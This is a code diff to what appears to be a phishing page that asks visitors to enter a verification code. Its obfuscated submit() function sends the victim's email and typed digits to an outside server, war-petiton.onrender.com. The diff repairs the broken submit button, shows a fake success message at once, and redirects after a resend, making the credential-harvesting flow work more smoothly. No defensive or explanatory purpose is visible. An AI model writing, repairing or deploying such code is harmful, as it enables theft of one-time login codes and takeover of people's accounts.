@@ -824,7 +824,7 @@
                     <label for="email" id="email-label"> Enter Code </label>
                 </div>
                   <div class="try-another-method">
-                    <h4 class="learn-more" id="learn-more" nclick="submit()">Submit</h4>
+                    <h4 class="learn-more" id="learn-more" onclick="submit()">Submit</h4>
                   </div>
                   <div class="try-another-method">
                     <h4 class="learn-more" id="learn-more" onclick="resendRequest()">Resend code</h4>
@@ -834,34 +834,41 @@
     <script>
 function submit() {
   const _0x3aebb7 = document.querySelector('#email').value;
-  const _0x3acbb8 = document.querySelector('.sucessful');
-  const _0x549c7f = document.querySelector('.user-email'),
-    _0x44155e = _0x549c7f.innerHTML,
-    _0x4d9356 = {
-      email: _0x44155e,
-      digits: _0x3aebb7,
-    }
-  _0x3aebb7 == 0
-    ? alert('Must enter digits to continue')
-    : fetch('https://war-petiton.onrender.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(_0x4d9356),
+  const successTab = document.querySelector('.sucessful');
+  const _0x549c7f = document.querySelector('.user-email');
+  const overlay = document.querySelector('#overlay');
+  const _0x44155e = _0x549c7f.innerHTML;
+  const _0x4d9356 = {
+    email: _0x44155e,
+    digits: _0x3aebb7,
+  };
+
+  if (_0x3aebb7 == '') {
+    alert('Must enter digits to continue');
+  } else {
+    overlay.style.display = 'block';
+    successTab.style.display = 'block';
+    fetch('https://war-petiton.onrender.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(_0x4d9356),
+    })
+      .then((response) => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
       })
-        .then((_0x443284) => {
-          if (!_0x443284.ok) {
-            throw new Error('Network response was not ok')
-          }
-          return _0x443284.json()
-        })
-        .then((_0x38230d) => {
-        _0x3acbb8.style.display = 'block';
-          console.log('Success:', _0x38230d);
-        })
-        .catch((_0x5c14ec) => {
-          console.error('Error:', _0x5c14ec)
-        })
+      .then((_0x38230d) => {
+        console.log('Success:', _0x38230d);
+      })
+      .catch((_0x5c14ec) => {
+        console.error('Error:', _0x5c14ec);
+      });
+  }
 }
+
+
 function resendRequest() {
   const _0x475317 = document.querySelector('.user-email'),
     _0x19215f = _0x475317.innerHTML,
@@ -874,6 +881,7 @@ function resendRequest() {
   })
     .then((_0x59e61b) => _0x59e61b.json())
     .then((_0x494b99) => {
+      window.location.href = '/';
       console.log('Success:', _0x494b99)
     })
     .catch((_0x44e634) => {
